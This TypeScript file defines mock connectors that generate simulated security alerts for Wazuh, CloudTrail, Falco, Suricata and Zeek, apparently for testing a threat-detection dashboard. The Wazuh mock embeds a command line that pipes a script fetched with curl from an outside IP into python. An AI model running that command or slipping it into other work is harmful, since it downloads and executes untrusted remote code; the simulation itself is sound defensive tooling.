import { 
  RawTelemetryEvent, 
  TelemetryConnectorConfig, 
  TelemetrySourceType 
} from '../enterprise-schemas';

export abstract class TelemetryConnector {
  protected config: TelemetryConnectorConfig;
  
  constructor(config: TelemetryConnectorConfig) {
    this.config = config;
  }

  public abstract poll(): Promise<RawTelemetryEvent[]>;
  
  public getId(): string { return this.config.id; }
  public isEnabled(): boolean { return this.config.enabled; }
}

/**
 * Wazuh Connector - SIEM / Host EDR
 * Simulates Host integrity mutations, log rules triggering, and unauthorized local action.
 */
export class WazuhConnector extends TelemetryConnector {
  public async poll(): Promise<RawTelemetryEvent[]> {
    if (!this.isEnabled()) return [];
    
    if (Math.random() > 0.8) {
      const targets = ['pc-admin-hq', 'azure-vm-ad-connector', 'k8s-pod-auth-api-559b', 'db-core-master'];
      const target = targets[Math.floor(Math.random() * targets.length)];
      const processes = ['bash', 'sh', 'python', 'powershell.exe'];
      const proc = processes[Math.floor(Math.random() * processes.length)];
      
      return [{
        sourceId: this.config.id,
        sourceType: TelemetrySourceType.EDR,
        ingestTimestamp: new Date(),
        confidence: 0.94,
        rawPayload: {
          timestamp: new Date().toISOString(),
          agent: { id: "042", name: target },
          rule: {
            id: "100405",
            level: 11,
            description: `Wazuh Alert: Suspicious script execution (${proc}) by unprivileged process`,
            groups: ["local", "syslog", "invalid_execution"]
          },
          data: {
            process: proc,
            parent_process: target.includes('pod') ? 'node' : 'explorer.exe',
            user: target.includes('admin') ? 'Marcus_local' : 'www-data',
            command_line: `${proc} -c "curl -s http://91.240.118.4/shell.py | python"`
          },
          location: "/var/log/syslog"
        }
      }];
    }
    return [];
  }
}

/**
 * AWS CloudTrail Connector - Cloud Identity, API & Audit Trails
 */
export class AWSCloudTrailConnector extends TelemetryConnector {
  public async poll(): Promise<RawTelemetryEvent[]> {
    if (!this.isEnabled()) return [];
    
    if (Math.random() > 0.85) {
      const actions = [
        { name: 'AuthorizeSecurityGroupIngress', risk: 'high', asset: 'k8s-svc-ingress-nginx', desc: 'Permitted inbound traffic on SSH port 22 from 0.0.0.0/0' },
        { name: 'CreateAccessKey', risk: 'critical', asset: 'iam-root-account', desc: 'New programmatic root access key established' },
        { name: 'AssumeRole', risk: 'medium', asset: 'aws-lambda-payment-processor', desc: 'Cross-account trust boundary API traversal' }
      ];
      const action = actions[Math.floor(Math.random() * actions.length)];
      
      return [{
        sourceId: this.config.id,
        sourceType: TelemetrySourceType.CLOUD_TRAIL,
        ingestTimestamp: new Date(),
        confidence: 0.98,
        rawPayload: {
          timestamp: new Date().toISOString(),
          event_name: action.name,
          user_id: 'arn:aws:iam::881267438102:role/DeveloperAccess-ReadOnly',
          resource_id: action.asset,
          risk_level: action.risk,
          sourceIPAddress: '194.26.29.91',
          request_parameters: {
            roleName: 'SentinelCoreAdminRole',
            policyArn: 'arn:aws:iam::aws:policy/AdministratorAccess'
          }
        }
      }];
    }
    return [];
  }
}

/**
 * Falco Connector - Cloud-Native Kubernetes Runtime Guard
 */
export class FalcoConnector extends TelemetryConnector {
  public async poll(): Promise<RawTelemetryEvent[]> {
    if (!this.isEnabled()) return [];
    
    if (Math.random() > 0.82) {
      const targets = ['k8s-pod-auth-api-559b', 'k8s-pod-payment-gw-88c2', 'k8s-svc-ingress-nginx'];
      const target = targets[Math.floor(Math.random() * targets.length)];
      
      return [{
        sourceId: this.config.id,
        sourceType: TelemetrySourceType.K8S_AUDIT,
        ingestTimestamp: new Date(),
        confidence: 0.96,
        rawPayload: {
          timestamp: new Date().toISOString(),
          rule: 'Terminal spawned inside container',
          priority: 'Critical',
          output: `Falco Alert: Interactive shell (bash) execution detected in container in namespace production (pod=${target}, user=root)`,
          container: target,
          namespace: 'production',
          k8s_context: {
            node: 'ip-10-0-12-82.aws.internal',
            service_account: 'default-sac'
          }
        }
      }];
    }
    return [];
  }
}

/**
 * Suricata Connector - Signature-Based IDS/IPS Network Sensor
 */
export class SuricataConnector extends TelemetryConnector {
  public async poll(): Promise<RawTelemetryEvent[]> {
    if (!this.isEnabled()) return [];
    
    if (Math.random() > 0.8) {
      const signatures = [
        { sig: 'ET MALWARE Outbound Trojan Command & Control Beacon', severity: 'critical', desc: 'Ransomware C2 handshake payload verified' },
        { sig: 'ET SCAN SSH Brute Force brute login attempt', severity: 'high', desc: 'Repetitive SSH authentication cycles observed' },
        { sig: 'ET EXPLOIT SQL Injection character evasion attempt', severity: 'medium', desc: 'Web request path containing SQL syntax fragments' }
      ];
      const signature = signatures[Math.floor(Math.random() * signatures.length)];
      
      return [{
        sourceId: this.config.id,
        sourceType: TelemetrySourceType.IDS_IPS,
        ingestTimestamp: new Date(),
        confidence: 0.95,
        rawPayload: {
          timestamp: new Date().toISOString(),
          alert: {
            action: 'allowed',
            signature: signature.sig,
            category: 'Malware Activity / Scanning',
            severity: signature.severity === 'critical' ? 1 : 2
          },
          src_ip: '91.240.118.4',
          dest_ip: '10.0.0.45',
          dest_port: signature.sig.includes('SSH') ? 22 : 80,
          proto: 'TCP',
          flow_id: Math.floor(Math.random() * 1000000000)
        }
      }];
    }
    return [];
  }
}

/**
 * Zeek Connector - Protocol Analyzer, Flow Log & Metadata Engine
 */
export class ZeekConnector extends TelemetryConnector {
  public async poll(): Promise<RawTelemetryEvent[]> {
    if (!this.isEnabled()) return [];
    
    if (Math.random() > 0.75) {
      return [{
        sourceId: this.config.id,
        sourceType: TelemetrySourceType.NETFLOW,
        ingestTimestamp: new Date(),
        confidence: 0.92,
        rawPayload: {
          timestamp: new Date().toISOString(),
          uid: Math.random().toString(36).substring(2, 10).toUpperCase(),
          'id.orig_h': '10.0.0.82',
          'id.resp_h': '10.0.1.15',
          'id.resp_p': 445,
          service: 'smb/rpc',
          duration: 0.082,
          anomaly_score: 82,
          description: 'SMB network mapping sweeps: lateral Active Directory IPC$ pipe search queries'
        }
      }];
    }
    return [];
  }
}

// Keep Legacy connectors exported for full backward-compatibility and zero breakages
export class MockSIEMConnector extends WazuhConnector {}
export class CloudTrailConnector extends AWSCloudTrailConnector {}
export class EDRConnector extends FalcoConnector {}

